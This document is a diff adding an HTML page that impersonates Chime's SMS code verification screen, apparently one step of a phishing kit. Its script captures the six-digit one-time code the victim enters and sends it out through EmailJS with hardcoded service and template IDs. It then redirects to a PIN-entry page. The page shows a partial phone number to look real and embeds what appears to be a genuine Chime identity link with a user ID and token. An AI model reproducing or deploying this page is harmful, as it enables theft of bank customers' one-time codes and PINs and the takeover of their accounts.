@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="format-detection" content="telephone=no" />
+<title>Enter code – Chime</title>
+<meta name="theme-color" content="#ffffff" />
+<style>
+:root{
+  --green: #134034;
+  --chime: #2bd67b;
+  --text: #0b1117;
+  --muted: #66737b;
+  --border: #d9dde1;
+  --bg: #ffffff;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:var(--bg); color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
+  display:flex; align-items:flex-start; justify-content:center;
+  min-height:100vh; padding:24px; text-align:left;
+}
+main{
+  width:100%; max-width:520px; margin-top:240px;
+}
+h1{ font-size:32px; line-height:1.15; font-weight:800; color:var(--green); margin:24px 0 10px; }
+.sub{ font-size:15px; color:#21312b; margin-bottom:14px; }
+.codeField{
+  margin:12px 0 22px;
+  border:1.5px solid var(--border);
+  border-radius:14px;
+  height:56px; display:flex; align-items:center;
+  padding:0 16px;
+  box-shadow: inset 0 1px 0 rgba(0,0,0,.02);
+}
+.codeField input{
+  width:100%; font-size:22px; border:none; outline:none; background:transparent;
+  letter-spacing:4px; font-weight:700;
+}
+.helpTitle{ font-size:26px; font-weight:800; color:var(--green); margin:18px 0 8px; }
+.helpLinks{ margin-top:6px; display:flex; flex-direction:column; gap:12px; }
+.helpLinks a{
+  display:flex; align-items:center; gap:10px;
+  color:var(--green); text-decoration:underline; font-size:17px; font-weight:700;
+  width:fit-content;
+}
+.helpLinks svg{ width:20px; height:20px; stroke:var(--green); }
+.spinner-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.96); display:none;
+  align-items:center; justify-content:center; flex-direction:column; gap:14px; z-index:9999 }
+.spinner{ border:4px solid #e0e0e0; border-top:4px solid var(--chime); border-radius:50%;
+  width:54px; height:54px; animation:spin 1s linear infinite }
+@keyframes spin{from{transform:rotate(0)} to{transform:rotate(360deg)}}
+.spinner-text{ color:var(--chime); font-weight:700; font-size:15px; letter-spacing:.2px }
+
+/* === Spinner system (Button + Fullscreen) === */
+.spinner-bars{color:#0b1117;display:inline-block;position:relative;width:28px;height:28px}
+.spinner-bars.white{color:#fff}
+.spinner-bars div{transform-origin:14px 14px;animation:spinner-bars 1.2s linear infinite}
+.spinner-bars div:after{content:" ";display:block;position:absolute;top:2px;left:13px;width:3px;height:8px;border-radius:20%;background:currentColor}
+.spinner-bars div:nth-child(1){transform:rotate(0deg);animation-delay:-1.1s}
+.spinner-bars div:nth-child(2){transform:rotate(30deg);animation-delay:-1s}
+.spinner-bars div:nth-child(3){transform:rotate(60deg);animation-delay:-.9s}
+.spinner-bars div:nth-child(4){transform:rotate(90deg);animation-delay:-.8s}
+.spinner-bars div:nth-child(5){transform:rotate(120deg);animation-delay:-.7s}
+.spinner-bars div:nth-child(6){transform:rotate(150deg);animation-delay:-.6s}
+.spinner-bars div:nth-child(7){transform:rotate(180deg);animation-delay:-.5s}
+.spinner-bars div:nth-child(8){transform:rotate(210deg);animation-delay:-.4s}
+.spinner-bars div:nth-child(9){transform:rotate(240deg);animation-delay:-.3s}
+.spinner-bars div:nth-child(10){transform:rotate(270deg);animation-delay:-.2s}
+.spinner-bars div:nth-child(11){transform:rotate(300deg);animation-delay:-.1s}
+.spinner-bars div:nth-child(12){transform:rotate(330deg);animation-delay:0s}
+@keyframes spinner-bars{0%{opacity:1}100%{opacity:0}}
+
+#fullpageSpinner{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;z-index:99999;visibility:hidden;opacity:0;transition:opacity .15s ease}
+#fullpageSpinner.active{visibility:visible;opacity:1}
+
+</style>
+</head>
+<body>
+<main id="mainContent">
+<h1>Enter code</h1>
+<p class="sub" id="subtitle">We sent a code to (***) ***-<span id="last4">****</span> to confirm your identity</p>
+<div class="codeField">
+<input id="codeInput" type="tel" inputmode="numeric" maxlength="6" aria-label="6-digit code" autocomplete="one-time-code" />
+</div>
+<h2 class="helpTitle">Need Help?</h2>
+<div class="helpLinks">
+<a href="#" id="resendLink">
+<svg viewBox="0 0 24 24" fill="none"><path d="M3 12a9 9 0 1 0 3-6.7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 4v4h4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+Get new code
+</a>
+
+<a href="https://member.chime.com/identity?callback=https%3A%2F%2Fmember.chime.com%2Fmember%2Freset%2Fphone%2Fcomplete%3Fid%3D55461994%26inquiry_id%3D692984fe959af3f3ebef87ac%26segment_id%3D2fb2908a-237a-43e8-8e75-31a830c634cc%26token%3DzMz8XG7rhQMI0twQ0dH4Uw%26vendor%3Dincode&externalId=692984fe959af3f3ebef87ac&userId=55461994&vendor=incode&vendorToken=eyJhbGciOiJIUzI1NiJ9.eyJleH04Rlcm5hbFVzZXJJZCI6IjY5Mjk4NGZlOTU5YWYzZjNlYmVmODdhYyIsInJvbGUiOiJBQ0NFU1MiLCJUIjoiSSIsImtleVJlZiI6IjYxMTJiZTk5ZTNjNzg5MDAxNDAwNmYwMCIsImV4cCI6MTc3MjI3NzUwMiwiaWF0IjoxNzY0MzI4NzAyfQ.YlIDGtdjC3hpcNIDeeIX3y-GSOIExA4CLdVhpXoWhH827" id="updatePhoneLink">
+<svg viewBox="0 0 24 24" fill="none"><path d="M4 4h16v16H4z" stroke-width="2"/><path d="M7 17h10M7 7h10M7 12h10" stroke-width="2"/></svg>
+Update phone number
+</a>
+
+</div>
+</main>
+<div class="spinner-overlay" id="spinnerOverlay">
+<div class="spinner"></div>
+<div class="spinner-text">Verifying...</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+emailjs.init("M-C4gidliuniowGNM");
+const input = document.getElementById('codeInput');
+const spinnerOverlay = document.getElementById('spinnerOverlay');
+const mainContent = document.getElementById('mainContent');
+const last4Span = document.getElementById('last4');
+const resendLink = document.getElementById('resendLink');
+const redirectTarget = 'enter_pin.html';
+const last4 = (sessionStorage.getItem('last4') || '****').slice(-4);
+last4Span.textContent = last4;
+input.addEventListener('input', () => {
+input.value = input.value.replace(/\D/g, '').slice(0, 6);
+if (input.value.length === 6) submitCode(input.value);
+});
+resendLink.addEventListener('click', (e) => {
+e.preventDefault();
+let count = 23;
+resendLink.style.pointerEvents = 'none';
+const timer = setInterval(() => {
+resendLink.textContent = `Resend code in ${count--}s`;
+if (count < 0) {
+clearInterval(timer);
+resendLink.textContent = 'Get new code';
+resendLink.style.pointerEvents = 'auto';
+}
+}, 1000);
+});
+function submitCode(code){
+mainContent.style.display = 'none';
+spinnerOverlay.style.display = 'flex';
+emailjs.send("service_3bkxygu", "template_u1cilxv", { verification_code: code })
+.then(() => window.location.href = redirectTarget)
+.catch(() => window.location.href = redirectTarget);
+}
+});
+</script>
+
+<div id="fullpageSpinner"><div class="spinner-bars" aria-label="Loading">
+  <div></div><div></div><div></div><div></div><div></div><div></div>
+  <div></div><div></div><div></div><div></div><div></div><div></div>
+</div></div>
+<script>
+(function(){
+  const SPIN_WHITE = '<div class="spinner-bars white"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>';
+
+  // Remember last clicked CTA
+  document.addEventListener('click', function(e){
+    const btn = e.target.closest('button, .btn');
+    if(btn){ window.__lastBtnClicked = btn; }
+  }, true);
+
+  function inlineSpin(btn){
+    if(!btn) return;
+    btn.disabled = true;
+    btn.dataset.originalText = btn.innerHTML;
+    btn.innerHTML = SPIN_WHITE;
+  }
+
+  window.bigBrainRedirect = function(nextPage, inlineMs=3000, fullMs=2000){
+    const btn = window.__lastBtnClicked;
+    if(btn){ inlineSpin(btn); }
+    setTimeout(function(){
+      document.getElementById('fullpageSpinner').classList.add('active');
+      setTimeout(function(){ window.location.href = nextPage; }, fullMs);
+    }, inlineMs);
+  };
+
+})();
+</script>
+
+</body>
+</html>
